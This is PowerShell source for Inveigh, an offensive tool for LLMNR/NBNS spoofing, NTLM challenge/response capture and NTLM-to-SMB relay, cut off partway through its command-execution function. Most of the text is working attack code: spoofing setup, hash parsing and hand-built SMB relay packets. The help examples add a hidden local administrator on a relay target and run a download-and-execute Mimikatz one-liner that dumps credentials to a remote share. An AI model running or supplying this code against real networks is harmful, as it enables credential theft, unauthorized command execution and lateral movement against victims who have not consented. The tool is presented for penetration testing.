Function Invoke-Inveigh
{
<#
.SYNOPSIS
Inveigh is a Windows PowerShell LLMNR/NBNS spoofer with challenge/response capture over HTTP(S)/SMB and NTLMv2 HTTP to SMB relay.

.DESCRIPTION
Inveigh is a Windows PowerShell LLMNR/NBNS spoofer designed to assist penetration testers that find themselves limited to a Windows system.
This can commonly occur while performing phishing attacks, USB drive attacks, VLAN pivoting, or simply being restricted to a Windows system as part of client imposed restrictions.

.PARAMETER IP
Specify a specific local IP address for listening. This IP address will also be used for LLMNR/NBNS spoofing if the 'SpoofIP' parameter is not set.

.PARAMETER SpooferIP
Specify an IP address for LLMNR/NBNS spoofing. This parameter is only necessary when redirecting victims to another system. 

.PARAMETER HTTP
Default = Enabled: Enable/Disable HTTP challenge/response capture.

.PARAMETER HTTPS
Default = Disabled: Enable/Disable HTTPS challenge/response capture. Warning, a cert will be installed in the local store and attached to port 443.
If the script does not exit gracefully, execute "netsh http delete sslcert ipport=0.0.0.0:443" and manually remove the certificate from "Local Computer\Personal" in the cert store.

.PARAMETER SMB
Default = Enabled: Enable/Disable SMB challenge/response capture. Warning, LLMNR/NBNS spoofing can still direct targets to the host system's SMB server.

.PARAMETER LLMNR
Default = Enabled: Enable/Disable LLMNR spoofing.

.PARAMETER NBNS
Default = Disabled: Enable/Disable NBNS spoofing.

.PARAMETER NBNSTypes
Default = 20: Comma separated list of NBNS types to spoof. Types include 00 = Workstation Service, 03 = Messenger Service, 20 = Server Service, 1B = Domain Name

.PARAMETER Challenge
Default = Random: Specify a 16 character hex NTLM challenge for use with the HTTP listener. If left blank, a random challenge will be generated for each request. 

.PARAMETER SMBRelay
Default = Disabled: Enable/Disable SMB relay.

.PARAMETER SMBRelayTarget
IP address of system to target for SMB relay.

.PARAMETER SMBRelayCommand
Command to execute on SMB relay target.

.PARAMETER SMBRelayUsernames
Default = All Usernames: Comma separated list of usernames to use for relay attacks. Accepts either just the username of domain\username format. 

.PARAMETER SMBRelayAutoDisable
Default = Enable: Automaticaly disable SMB relay after a successful command execution on target.

.PARAMETER SMBRelayNetworkTimeout
Default = No Timeout: Set the duration in seconds that Inveigh will wait for a reply from the SMB relay target after each packet is sent.

.PARAMETER Repeat
Default = Enabled: Enable/Disable repeated LLMNR/NBNS spoofs to a victim system after one user challenge/response has been captured.

.PARAMETER ForceWPADAuth
Default = Enabled: Matches Responder option to Enable/Disable authentication for wpad.dat GET requests. Disabling can prevent browser login prompts.

.PARAMETER ConsolePrompt
Default = Enabled: Enable/Disable the console prompt.

.PARAMETER RunTime
Set the run time duration in minutes. Note that leaving the Inveigh console open will prevent Inveigh from exiting once the set run time is reached.

.PARAMETER ConsoleOutput
Default = Console Output Disabled: Enable/Disable real time console output.

.PARAMETER FileOutput
Default = File Output Disabled: Enable/Disable real time file output.

.PARAMETER StatusOutput
Default = Status Output Enabled: Enable/Disable statup and shutdown output.

.PARAMETER OutputDir
Default = Working Directory: Set an output directory for log and capture files.

.PARAMETER ShowHelp
Default = Enabled: Enable/Disable the help messages at startup.

.EXAMPLE
Import-Module;Invoke-Inveigh
Import module and execute with all default settings.

.EXAMPLE
. ./Inveigh.ps1;Invoke-Inveigh -IP 192.168.1.10
Dot source load and execute specifying a specific local listening/spoofing IP.

.EXAMPLE
Invoke-Inveigh -IP 192.168.1.10 -HTTP N
Execute specifying a specific local listening/spoofing IP and disabling HTTP challenge/response.

.EXAMPLE
Invoke-Inveigh -Repeat N -ForceWPADAuth N
Execute with the stealthiest options.

.EXAMPLE
Invoke-Inveigh -HTTP N -LLMNR N
Execute with LLMNR/NBNS spoofing disabled and challenge/response capture over SMB only. This may be useful for capturing non-Kerberos authentication attempts on a file server.

.EXAMPLE
Invoke-Inveigh -IP 192.168.1.10 -SpooferIP 192.168.2.50 -HTTP N
Execute specifying a specific local listening IP and a LLMNR/NBNS spoofing IP on another subnet. This may be useful for sending traffic to a controlled Linux system on another subnet.

.EXAMPLE
Invoke-Inveigh -SMBRelay y -SMBRelayTarget 192.168.2.55 -SMBRelayCommand "net user Dave Summer2015 /add && net localgroup administrators Dave /add"
Execute with SMB relay enabled with a command that will create a local administrator account on the SMB relay target.  

.EXAMPLE
Invoke-Inveigh -smbrelay y -smbrelaytarget 192.168.2.55 -smbrelaycommand "powershell \\192.168.2.50\temp$\powermeup.cmd"
Execute with SMB relay enabled and using Mubix's powermeup.cmd method of launching Invoke-Mimikatz.ps1 and uploading output. In this example, a hidden anonymous share containing Invoke-Mimikatz.ps1 is employed on the Inveigh host system. 
Powermeup.cmd contents used for this example:
powershell "IEX (New-Object Net.WebClient).DownloadString('\\192.168.2.50\temp$\Invoke-Mimikatz.ps1'); Invoke-Mimikatz -DumpCreds > \\192.168.2.50\temp$\%COMPUTERNAME%.txt 2>&1"
Original version:
https://github.com/mubix/post-exploitation/blob/master/scripts/mass_mimikatz/powermeup.cmd

.NOTES
1. An elevated administrator or SYSTEM shell is needed.
2. Currently supports IPv4 LLMNR/NBNS spoofing and HTTP/SMB NTLMv1/NTLMv2 challenge/response capture.
3. LLMNR/NBNS spoofing is performed through sniffing and sending with raw sockets.
4. SMB challenge/response captures are performed by sniffing over the host system's SMB service.
5. HTTP challenge/response captures are performed with a dedicated listener.
6. The local LLMNR/NBNS services do not need to be disabled on the host system.
7. LLMNR/NBNS spoofer will point victims to host system's SMB service, keep account lockout scenarios in mind.
8. Kerberos should downgrade for SMB authentication due to spoofed hostnames not being valid in DNS.
9. Ensure that the LMMNR,NBNS,SMB,HTTP ports are open within any local firewall on the host system.
10. If you copy/paste challenge/response captures from output window for password cracking, remove carriage returns.
11. SMB relay support is experimental at this point, use caution if employing on a pen test.

.LINK
https://github.com/Kevin-Robertson/Inveigh
#>

# Default parameter values can be modified below 
param
( 
    [parameter(Mandatory=$false)][ValidateScript({$_ -match [IPAddress]$_ })][string]$IP = "",
    [parameter(Mandatory=$false)][ValidateScript({$_ -match [IPAddress]$_ })][string]$SpooferIP = "",
    [parameter(Mandatory=$false)][ValidateSet("Y","N")][string]$HTTP="Y",
    [parameter(Mandatory=$false)][ValidateSet("Y","N")][string]$HTTPS="N",
    [parameter(Mandatory=$false)][ValidateSet("Y","N")][string]$SMB="Y",
    [parameter(Mandatory=$false)][ValidateSet("Y","N")][string]$LLMNR="Y",
    [parameter(Mandatory=$false)][ValidateSet("Y","N")][string]$NBNS="N",
    [parameter(Mandatory=$false)][ValidateSet("00","03","20","1B","1C","1D","1E")][array]$NBNSTypes="20",
    [parameter(Mandatory=$false)][ValidatePattern('^[A-Fa-f0-9]{16}$')][string]$Challenge="",
    [parameter(Mandatory=$false)][ValidateSet("Y","N")][string]$SMBRelay="N",
    [parameter(Mandatory=$false)][ValidateScript({$_ -match [IPAddress]$_ })][string]$SMBRelayTarget ="",
    [parameter(Mandatory=$false)][array]$SMBRelayUsernames,
    [parameter(Mandatory=$false)][ValidateSet("Y","N")][string]$SMBRelayAutoDisable="Y",
    [parameter(Mandatory=$false)][int]$SMBRelayNetworkTimeout="",
    [parameter(Mandatory=$false)][string]$SMBRelayCommand = "",
    [parameter(Mandatory=$false)][ValidateSet("Y","N")][string]$Repeat="Y",
    [parameter(Mandatory=$false)][ValidateSet("Y","N")][string]$ForceWPADAuth="Y",
    [parameter(Mandatory=$false)][ValidateSet("Y","N")][string]$ConsoleOutput="N",
    [parameter(Mandatory=$false)][ValidateSet("Y","N")][string]$FileOutput="N",
    [parameter(Mandatory=$false)][ValidateSet("Y","N")][string]$StatusOutput="Y",
    [parameter(Mandatory=$false)][ValidateScript({Test-Path $_})][string]$OutputDir="",
    [parameter(Mandatory=$false)][int]$RunTime="",
    [parameter(Mandatory=$false)][ValidateSet("Y","N")][string]$ShowHelp="Y",
    [parameter(ValueFromRemainingArguments=$true)] $invalid_parameter
)

if ($invalid_parameter)
{
    throw "$($invalid_parameter) is not a valid parameter."
}

if(-not($IP))
{ 
    $IP = (Test-Connection 127.0.0.1 -count 1 | select -ExpandProperty Ipv4Address)
}

if(-not($SpooferIP))
{
    $SpooferIP = $IP  
}

if($SMBRelay -eq 'y')
{
    if(!$SMBRelayTarget)
    {
        Throw "You must specify an -SMBRelayTarget if enabling -SMBRelay"
    }

    if(!$SMBRelayCommand)
    {
        Throw "You must specify an -SMBRelayCommand if enabling -SMBRelay"
    }
}

if(-not($OutputDir))
{ 
    $output_directory = $PWD.Path
}
else
{
    $output_directory = $OutputDir
}

if(!$inveigh)
{
    $global:inveigh = [hashtable]::Synchronized(@{})
    $inveigh.console_queue = New-Object System.Collections.ArrayList
    $inveigh.log = New-Object System.Collections.ArrayList
    $inveigh.NTLMv1_list = New-Object System.Collections.ArrayList
    $inveigh.NTLMv2_list = New-Object System.Collections.ArrayList
    $inveigh.IP_capture_list = @()
    $inveigh.SMBRelay_failed_list = @()
}

$inveigh.running = $false
$inveigh.sniffer_socket = $null

if($inveigh.HTTP_listener.IsListening)
{
    $inveigh.HTTP_listener.Stop()
    $inveigh.HTTP_listener.Close()
}

$inveigh.log_file_queue = New-Object System.Collections.ArrayList
$inveigh.NTLMv1_file_queue = New-Object System.Collections.ArrayList
$inveigh.NTLMv2_file_queue = New-Object System.Collections.ArrayList
$inveigh.certificate_thumbprint = "76a49fd27011cf4311fb6914c904c90a89f3e4b2"
$inveigh.host = $host
$inveigh.HTTP_challenge_queue = New-Object System.Collections.ArrayList
$inveigh.SMB_relay_active_step = 0
$inveigh.console_output = $false
$inveigh.file_output = $false
$inveigh.log_out_file = $output_directory + "\Inveigh-Log.txt"
$inveigh.NTLMv1_out_file = $output_directory + "\Inveigh-NTLMv1.txt"
$inveigh.NTLMv2_out_file = $output_directory + "\Inveigh-NTLMv2.txt"
$inveigh.running = $true

if($StatusOutput -eq 'y')
{
    $inveigh.status_output = $true
}
else
{
    $inveigh.status_output = $false
}

# Write startup messages
if($inveigh.status_output)
{
    Write-Output "Inveigh started at $(Get-Date -format 's')"
    $inveigh.log.add("$(Get-Date -format 's') - Inveigh started") |out-null

    if($FileOutput -eq 'y')
    {
        "$(Get-Date -format 's') - Inveigh started" |Out-File $Inveigh.log_out_file -Append
    }

    Write-Output "Listening IP Address = $IP"
    Write-Output "LLMNR/NBNS Spoofer IP Address = $SpooferIP"

    if($LLMNR -eq 'y')
    {
        Write-Output 'LLMNR Spoofing Enabled'
        $LLMNR_response_message = "- spoofed response has been sent"
    }
    else
    {
        Write-Output 'LLMNR Spoofing Disabled'
        $LLMNR_response_message = "- LLMNR spoofing is disabled"
    }

    if($NBNS -eq 'y')
    {
        $NBNSTypes_output = $NBNSTypes -join ","
    
        if($NBNSTypes.Count -eq 1)
        {
            Write-Output "NBNS Spoofing Of Type $NBNSTypes_output Enabled"
        }
        else
        {
            Write-Output "NBNS Spoofing Of Types $NBNSTypes_output Enabled"
        }
    
        $NBNS_response_message = "- spoofed response has been sent"
    }
    else
    {
        Write-Output 'NBNS Spoofing Disabled'
        $NBNS_response_message = "- NBNS spoofing is disabled"
    }

    if($Challenge)
    {
        Write-Output "NTLM Challenge = $Challenge"
    }


    if($HTTP -eq 'y')
    {
        $inveigh.HTTP = $true
        Write-Output 'HTTP Capture Enabled'
    }
    else
    {
        $inveigh.HTTP = $false
        Write-Output 'HTTP Capture Disabled'
    }

    if($HTTPS -eq 'y')
    {
        try
        {
            $inveigh.HTTPS = $true
            $certificate_store = New-Object System.Security.Cryptography.X509Certificates.X509Store("My","LocalMachine")
            $certificate_store.Open('ReadWrite')
            $certificate = New-Object System.Security.Cryptography.X509Certificates.X509Certificate2
            $certificate.Import($PWD.Path + "\inveigh.pfx")
            $certificate_store.Add($certificate) 
            $certificate_store.Close()
            Invoke-Expression -command ("netsh http add sslcert ipport=0.0.0.0:443 certhash=" + $inveigh.certificate_thumbprint + " appid='{00112233-4455-6677-8899-AABBCCDDEEFF}'") > $null
            Write-Output 'HTTPS Capture Enabled'
        }
        catch
        {
            $certificate_store.Close()
            $HTTPS="N"
            $inveigh.HTTPS = $false
            Write-Output 'HTTPS Capture Disabled Due To Certificate Install Error'
        }
    }
    else
    {
        Write-Output 'HTTPS Capture Disabled'
    }

    if($SMB -eq 'y')
    {
        Write-Output 'SMB Capture Enabled'
    }
    else
    {
        Write-Output 'SMB Capture Disabled'
    }

    if($SMBRelay -eq 'y')
    {
        Write-Output 'SMB Relay Enabled'
        Write-Output "SMB Relay Target = $SMBRelayTarget"

        if($SMBRelayUsernames.Count -gt 0)
        {
            $SMBRelayUsernames_output = $SMBRelayUsernames -join ","
    
            if($SMBRelayUsernames.Count -eq 1)
            {
                Write-Output "SMB Relay Username = $SMBRelayUsernames_output"
            }
            else
            {
                Write-Output "SMB Relay Usernames = $SMBRelayUsernames_output"
            }
        }
    
        $inveigh.SMB_relay = $true
    }
    else
    {
        Write-Output 'SMB Relay Disabled'
        $inveigh.SMB_relay = $false
    }

    if($SMBRelayAutodisable -eq 'y')
    {
        Write-Output 'SMB Relay Auto Disable Enabled'
    }
    else
    {
        Write-Output 'SMB Relay Auto Disable Disabled'
    }

    if($SMBRelayNetworkTimeout)
    {
        Write-Output "SMB Relay Network Timeout = $SMBRelayNetworkTimeout Seconds"
    }

    if($Repeat -eq 'y')
    {
        Write-Output 'Spoof Repeating Enabled'
    }
    else
    {
        Write-Output 'Spoof Repeating Disabled'
    }

    if($ForceWPADAuth -eq 'y')
    {
        Write-Output 'Force WPAD Authentication Enabled'
    }
    else
    {
        Write-Output 'Force WPAD Authentication Disabled'
    }

    if($RunTime -eq 1)
    {
        Write-Output "Run Time = $RunTime Minute"
    }
    elseif($RunTime -gt 1)
    {
        Write-Output "Run Time = $RunTime Minutes"
    }

    if($ConsoleOutput -eq 'y')
    {
        Write-Output 'Console Output Enabled'
        $inveigh.console_output = $true
    }
    else
    {
        Write-Output 'Console Output Disabled'
    }

    if($FileOutput -eq 'y')
    {
        Write-Output 'File Output Enabled'
        Write-Output "Output Directory = $output_directory"
        $inveigh.file_output = $true
    }
    else
    {
        Write-Output 'File Output Disabled'
    }

    if($ShowHelp -eq 'y')
    {
        Write-Output 'Run Get-InveighHelp to show available cmdlets'
        Write-Warning 'Run Stop-Inveigh to stop Inveigh'
    }
}

$process_ID = [System.Diagnostics.Process]::GetCurrentProcess() |select -expand id
$process_ID = [BitConverter]::ToString([BitConverter]::GetBytes($process_ID))
$process_ID = $process_ID -replace "-00-00",""
[Byte[]]$inveigh.process_ID_bytes = $process_ID.Split("-") | FOREACH{[CHAR][CONVERT]::toint16($_,16)}

# Begin ScriptBlocks

# Shared Basic Functions ScriptBlock
$shared_basic_functions_scriptblock =
{
    Function DataToUInt16( $field )
    {
	   [Array]::Reverse( $field )
	   return [BitConverter]::ToUInt16( $field, 0 )
    }

    Function DataToUInt32( $field )
    {
	   [Array]::Reverse( $field )
	   return [BitConverter]::ToUInt32( $field, 0 )
    }

    Function DataLength
    {
        param ([int]$length_start,[byte[]]$string_extract_data)

        $string_length = [System.BitConverter]::ToInt16($string_extract_data[$length_start..($length_start + 1)],0)
        return $string_length
    }

    Function DataToString
    {
        param ([int]$string_length,[int]$string2_length,[int]$string3_length,[int]$string_start,[byte[]]$string_extract_data)

        $string_data = [System.BitConverter]::ToString($string_extract_data[($string_start+$string2_length+$string3_length)..($string_start+$string_length+$string2_length+$string3_length-1)])
        $string_data = $string_data -replace "-00",""
        $string_data = $string_data.Split("-") | FOREACH{ [CHAR][CONVERT]::toint16($_,16)}
        $string_extract = New-Object System.String ($string_data,0,$string_data.Length)
        return $string_extract
    }
}

# SMB NTLM Functions ScriptBlock - function for parsing NTLM challenge/response
$SMB_NTLM_functions_scriptblock =
{
    Function SMBNTLMChallenge
    {
        param ([byte[]]$payload_bytes)

        $payload = [System.BitConverter]::ToString($payload_bytes)
        $payload = $payload -replace "-",""
        $NTLM_index = $payload.IndexOf("4E544C4D53535000")

        if($payload.SubString(($NTLM_index + 16),8) -eq "02000000")
        {
            $NTLM_challenge = $payload.SubString(($NTLM_index + 48),16)
        }

        return $NTLM_challenge
    }

    Function SMBNTLMResponse
    {
        param ([byte[]]$payload_bytes)

        $payload = [System.BitConverter]::ToString($payload_bytes)
        $payload = $payload -replace "-",""
        $NTLM_index = $payload.IndexOf("4E544C4D53535000")
        $NTLM_bytes_index = $NTLM_index / 2

        if($payload.SubString(($NTLM_index + 16),8) -eq "03000000")
        {
            $LM_length = DataLength ($NTLM_bytes_index + 12) $payload_bytes
            $LM_offset = $payload_bytes[($NTLM_bytes_index + 16)]

            if($LM_length -ge 24)
            {
                $NTLM_length = DataLength ($NTLM_bytes_index + 20) $payload_bytes
                $NTLM_offset = $payload_bytes[($NTLM_bytes_index + 24)]

                $NTLM_domain_length = DataLength ($NTLM_bytes_index + 28) $payload_bytes
                $NTLM_domain_offset = DataLength ($NTLM_bytes_index + 32) $payload_bytes
                $NTLM_domain_string = DataToString $NTLM_domain_length 0 0 ($NTLM_bytes_index + $NTLM_domain_offset) $payload_bytes

                $NTLM_user_length = DataLength ($NTLM_bytes_index + 36) $payload_bytes
                $NTLM_user_string = DataToString $NTLM_user_length $NTLM_domain_length 0 ($NTLM_bytes_index + $NTLM_domain_offset) $payload_bytes

                $NTLM_host_length = DataLength ($NTLM_bytes_index + 44) $payload_bytes
                $NTLM_host_string = DataToString $NTLM_host_length $NTLM_user_length $NTLM_domain_length ($NTLM_bytes_index + $NTLM_domain_offset) $payload_bytes

                if(([BitConverter]::ToString($payload_bytes[($NTLM_bytes_index + $LM_offset)..($NTLM_bytes_index + $LM_offset + $LM_length - 1)]) -replace "-","") -eq ("00" * $LM_length))
                {
                    $NTLMv2_response = [System.BitConverter]::ToString($payload_bytes[($NTLM_bytes_index + $NTLM_offset)..($NTLM_bytes_index + $NTLM_offset + $NTLM_length - 1)]) -replace "-",""
                    $NTLMv2_response = $NTLMv2_response.Insert(32,':')
                    $NTLMv2_hash = $NTLM_user_string + "::" + $NTLM_domain_string + ":" + $NTLM_challenge + ":" + $NTLMv2_response

                    if($source_IP -ne $IP)
                    {      
                        $inveigh.log.add($inveigh.log_file_queue[$inveigh.log_file_queue.add("$(Get-Date -format 's') - SMB NTLMv2 challenge/response for $NTLM_domain_string\$NTLM_user_string captured from $source_IP($NTLM_host_string)")])   
                        $inveigh.NTLMv2_file_queue.add($NTLMv2_hash)
                        $inveigh.NTLMv2_list.add($NTLMv2_hash)
                        $inveigh.console_queue.add("$(Get-Date -format 's') - SMB NTLMv2 challenge/response captured from $source_IP($NTLM_host_string):`n$NTLMv2_hash")

                        if($inveigh.file_output)
                        {
                            $inveigh.console_queue.add("SMB NTLMv2 challenge/response written to " + $inveigh.NTLMv2_out_file)
                        }

                    }
                }
                else
                {
                    $NTLMv1_response = [System.BitConverter]::ToString($payload_bytes[($NTLM_bytes_index + $LM_offset)..($NTLM_bytes_index + $LM_offset + $NTLM_length + $LM_length - 1)]) -replace "-",""
                    $NTLMv1_response = $NTLMv1_response.Insert(48,':')
                    $NTLMv1_hash = $NTLM_user_string + "::" + $NTLM_domain_string + ":" + $NTLMv1_response + ":" + $NTLM_challenge

                    if($source_IP -ne $IP)
                    {    
                        $inveigh.log.add($inveigh.log_file_queue[$inveigh.log_file_queue.add("$(Get-Date -format 's') - SMB NTLMv1 challenge/response for $NTLM_domain_string\$NTLM_user_string captured from $source_IP($NTLM_host_string)")])
                        $inveigh.NTLMv1_file_queue.add($NTLMv1_hash)
                        $inveigh.NTLMv1_list.add($NTLMv1_hash)
                        $inveigh.console_queue.add("$(Get-Date -format 's') SMB NTLMv1 challenge/response captured from $source_IP($NTLM_host_string):`n$NTLMv1_hash")

                        if($inveigh.file_output)
                        {
                            $inveigh.console_queue.add("SMB NTLMv1 challenge/response written to " + $inveigh.NTLMv1_out_file)
                        }
  
                    }
                }

                if (($inveigh.IP_capture_list -notcontains $source_IP) -and (-not $NTLM_user_string.EndsWith('$')) -and ($Repeat -eq 'n') -and ($source_IP -ne $IP))
                {
                    $inveigh.IP_capture_list += $source_IP
                }
            }
        }
    }
}

# SMB Relay Challenge ScriptBlock - gathers NTLM server challenge from relay target
$SMB_relay_challenge_scriptblock =
{
    Function SMBRelayChallenge
    {
        param ($SMB_relay_socket,$HTTP_request_bytes)

        if ($SMB_relay_socket)
        {
            $SMB_relay_challenge_stream = $SMB_relay_socket.GetStream()
        }
        
        $SMB_relay_challenge_bytes = New-Object System.Byte[] 1024
        $i = 0
        
        :SMB_relay_challenge_loop while ($i -lt 2)
        {
            switch ($i)
            {
                0 {
                    [Byte[]] $SMB_relay_challenge_send = (0x00,0x00,0x00,0x2f,0xff,0x53,0x4d,0x42,0x72,0x00,0x00,0x00,0x00,0x18,0x01,0x48)`
                        + (0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0xff,0xff)`
                        + $inveigh.process_ID_bytes`
                        + (0x00,0x00,0x00,0x00,0x00,0x0c,0x00,0x02,0x4e,0x54,0x20,0x4c,0x4d,0x20,0x30,0x2e,0x31,0x32,0x00)
                }
                
                1 { 
                    $SMB_length_1 = '0x{0:X2}' -f ($HTTP_request_bytes.length + 32)
                    $SMB_length_2 = '0x{0:X2}' -f ($HTTP_request_bytes.length + 22)
                    $SMB_length_3 = '0x{0:X2}' -f ($HTTP_request_bytes.length + 2)
                    $SMB_NTLMSSP_length = '0x{0:X2}' -f ($HTTP_request_bytes.length)
                    $SMB_blob_length = [BitConverter]::ToString([BitConverter]::GetBytes($HTTP_request_bytes.length + 34))
                    $SMB_blob_length = $SMB_blob_length -replace "-00-00",""
                    $SMB_blob_length = $SMB_blob_length.Split("-") | FOREACH{ [CHAR][CONVERT]::toint16($_,16)}
                    $SMB_byte_count = [BitConverter]::ToString([BitConverter]::GetBytes($HTTP_request_bytes.length + 45))
                    $SMB_byte_count = $SMB_byte_count -replace "-00-00",""
                    $SMB_byte_count = $SMB_byte_count.Split("-") | FOREACH{ [CHAR][CONVERT]::toint16($_,16)}
                    $SMB_netbios_length = [BitConverter]::ToString([BitConverter]::GetBytes($HTTP_request_bytes.length + 104))
                    $SMB_netbios_length = $SMB_netbios_length -replace "-00-00",""
                    $SMB_netbios_length = $SMB_netbios_length.Split("-") | FOREACH{ [CHAR][CONVERT]::toint16($_,16)}
                    [array]::Reverse($SMB_netbios_length)
                    
                    [Byte[]] $SMB_relay_challenge_send = (0x00,0x00)`
                        + $SMB_netbios_length`
                        + (0xff,0x53,0x4d,0x42,0x73,0x00,0x00,0x00,0x00,0x18,0x01,0x48,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0xff,0xff)`
                        + $inveigh.process_ID_bytes`
                        + (0x00,0x00,0x00,0x00,0x0c,0xff,0x00,0x00,0x00,0xff,0xff,0x02,0x00,0x01,0x00,0x00,0x00,0x00,0x00)`
                        + $SMB_blob_length`
                        + (0x00,0x00,0x00,0x00,0x44,0x00,0x00,0x80)`
                        + $SMB_byte_count`
                        + (0x60)`
                        + $SMB_length_1`
                        + (0x06,0x06,0x2b,0x06,0x01,0x05,0x05,0x02,0xa0)`
                        + $SMB_length_2`
                        + (0x30,0x3c,0xa0,0x0e,0x30,0x0c,0x06,0x0a,0x2b,0x06,0x01,0x04,0x01,0x82,0x37,0x02,0x02,0x0a,0xa2)`
                        + $SMB_length_3`
                        + (0x04)`
                        + $SMB_NTLMSSP_length`
                        + $HTTP_request_bytes`
                        + (0x55,0x6e,0x69,0x78,0x00,0x53,0x61,0x6d,0x62,0x61,0x00)
                }
            }

            $SMB_relay_challenge_stream.write($SMB_relay_challenge_send, 0, $SMB_relay_challenge_send.length)
            $SMB_relay_challenge_stream.Flush()
            
            if($SMBRelayNetworkTimeout)
            {
                $SMB_relay_challenge_timeout = new-timespan -Seconds $SMBRelayNetworkTimeout
                $SMB_relay_challenge_stopwatch = [diagnostics.stopwatch]::StartNew()
                
                while(!$SMB_relay_challenge_stream.DataAvailable)
                {
                    if($SMB_relay_challenge_stopwatch.elapsed -ge $SMB_relay_challenge_timeout)
                    {
                        $inveigh.console_queue.add("SMB relay target didn't respond within $SMBRelayNetworkTimeout seconds")
                        $inveigh.log.add($inveigh.log_file_queue[$inveigh.log_file_queue.add("$(Get-Date -format 's') - SMB relay target didn't respond within $SMBRelayNetworkTimeout seconds")])
                        $inveigh.SMB_relay_active_step = 0
                        $SMB_relay_socket.Close()
                        break SMB_relay_challenge_loop
                    }
                }
            }
    
            $SMB_relay_challenge_stream.Read($SMB_relay_challenge_bytes, 0, $SMB_relay_challenge_bytes.length)

            $i++
        }
        
        return $SMB_relay_challenge_bytes
    }
}

# SMB Relay Response ScriptBlock - sends NTLM reponse to relay target
$SMB_relay_response_scriptblock =
{
    Function SMBRelayResponse
    {
        param ($SMB_relay_socket,$HTTP_request_bytes,$SMB_user_ID)
    
        $SMB_relay_response_bytes = New-Object System.Byte[] 1024
        if ($SMB_relay_socket)
        {
            $SMB_relay_response_stream = $SMB_relay_socket.GetStream()
        }
        
        $SMB_length_1 = '0x{0:X2}' -f ($HTTP_request_bytes.length - 244)
        $SMB_length_2 = '0x{0:X2}' -f ($HTTP_request_bytes.length - 248)
        $SMB_length_3 = '0x{0:X2}' -f ($HTTP_request_bytes.length - 252)
        $SMB_NTLMSSP_length = '0x{0:X2}' -f ($HTTP_request_bytes.length - 256)
        $SMB_blob_length = [BitConverter]::ToString([BitConverter]::GetBytes($HTTP_request_bytes.length + 16))
        $SMB_blob_length = $SMB_blob_length -replace "-00-00",""
        $SMB_blob_length = $SMB_blob_length.Split("-") | FOREACH{ [CHAR][CONVERT]::toint16($_,16)}
        $SMB_byte_count = [BitConverter]::ToString([BitConverter]::GetBytes($HTTP_request_bytes.length + 27))
        $SMB_byte_count = $SMB_byte_count -replace "-00-00",""
        $SMB_byte_count = $SMB_byte_count.Split("-") | FOREACH{ [CHAR][CONVERT]::toint16($_,16)}
        $SMB_netbios_length = [BitConverter]::ToString([BitConverter]::GetBytes($HTTP_request_bytes.length + 86))
        $SMB_netbios_length = $SMB_netbios_length -replace "-00-00",""
        $SMB_netbios_length = $SMB_netbios_length.Split("-") | FOREACH{ [CHAR][CONVERT]::toint16($_,16)}
        [array]::Reverse($SMB_netbios_length)
        
        $j = 0
        
        :SMB_relay_response_loop while ($j -lt 1)
        {
            [Byte[]] $SMB_relay_response_send = (0x00,0x00)`
                + $SMB_netbios_length`
                + (0xff,0x53,0x4d,0x42,0x73,0x00,0x00,0x00,0x00,0x18,0x01,0x48,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0xff,0xff)`
                + $inveigh.process_ID_bytes`
                + $SMB_user_ID`
                + (0x00,0x00,0x0c,0xff,0x00,0x00,0x00,0xff,0xff,0x02,0x00,0x01,0x00,0x00,0x00,0x00,0x00)`
                + $SMB_blob_length`
                + (0x00,0x00,0x00,0x00,0x44,0x00,0x00,0x80)`
                + $SMB_byte_count`
                + (0xa1,0x82,0x01)`
                + $SMB_length_1`
                + (0x30,0x82,0x01)`
                + $SMB_length_2`
                + (0xa2,0x82,0x01)`
                + $SMB_length_3`
                + (0x04,0x82,0x01)`
                + $SMB_NTLMSSP_length`
                + $HTTP_request_bytes`
                + (0x55,0x6e,0x69,0x78,0x00,0x53,0x61,0x6d,0x62,0x61,0x00)
            
            $SMB_relay_response_stream.write($SMB_relay_response_send, 0, $SMB_relay_response_send.length)
        	$SMB_relay_response_stream.Flush()
            
            if($SMBRelayNetworkTimeout)
            {
                $SMB_relay_response_timeout = new-timespan -Seconds $SMBRelayNetworkTimeout
                $SMB_relay_response_stopwatch = [diagnostics.stopwatch]::StartNew()
                    
                while(!$SMB_relay_response_stream.DataAvailable)
                {
                    if($SMB_relay_response_stopwatch.elapsed -ge $SMB_relay_response_timeout)
                    {
                        $inveigh.console_queue.add("SMB relay target didn't respond within $SMBRelayNetworkTimeout seconds")
                        $inveigh.log.add($inveigh.log_file_queue[$inveigh.log_file_queue.add("$(Get-Date -format 's') - SMB relay target didn't respond within $SMBRelayNetworkTimeout seconds")])
                        $inveigh.SMB_relay_active_step = 0
                        $SMB_relay_socket.Close()
                        break :SMB_relay_response_loop
                    }
                }
            }

            $SMB_relay_response_stream.Read($SMB_relay_response_bytes, 0, $SMB_relay_response_bytes.length)
            
            $inveigh.SMB_relay_active_step = 2
            
            $j++
        
        }
        return $SMB_relay_response_bytes
    }
}

# SMB Relay Execute ScriptBlock - executes command within authenticated SMB session
$SMB_relay_execute_scriptblock =
{
    Function SMBRelayExecute
    {
        param ($SMB_relay_socket,$SMB_user_ID)
    
        if ($SMB_relay_socket)
        {
            $SMB_relay_execute_stream = $SMB_relay_socket.GetStream()
        }
        
        $SMB_relay_execute_bytes = New-Object System.Byte[] 1024
        
        $SMB_service_random = [String]::Join("00-", (1..11 | % {"{0:X2}-" -f (Get-Random -Minimum 65 -Maximum 90)}))
        $SMB_machine += '53-00-52-00-56-00-' + $SMB_service_random + '00-00-00'
        $SMB_service_name = $SMB_service_random + '00-00-00'
        $SMB_service_display = '49-00-56-00-53-00-52-00-56-00-' + $SMB_service_random + '00-00-00'
        [Byte[]]$SMB_machine_bytes = $SMB_machine.Split("-") | FOREACH{ [CHAR][CONVERT]::toint16($_,16)}
        [Byte[]]$SMB_service_bytes = $SMB_service_name.Split("-") | FOREACH{ [CHAR][CONVERT]::toint16($_,16)}
        [Byte[]]$SMB_service_display_bytes = $SMB_service_display.Split("-") | FOREACH{ [CHAR][CONVERT]::toint16($_,16)}
        
        $SMBRelayCommand = "%COMSPEC% /C `"" + $SMBRelayCommand + "`""
        [System.Text.Encoding]::ASCII.GetBytes($SMBRelayCommand) | % { $SMB_relay_command += "{0:X2}-00-" -f $_ }
        $SMB_relay_command += '00-00'
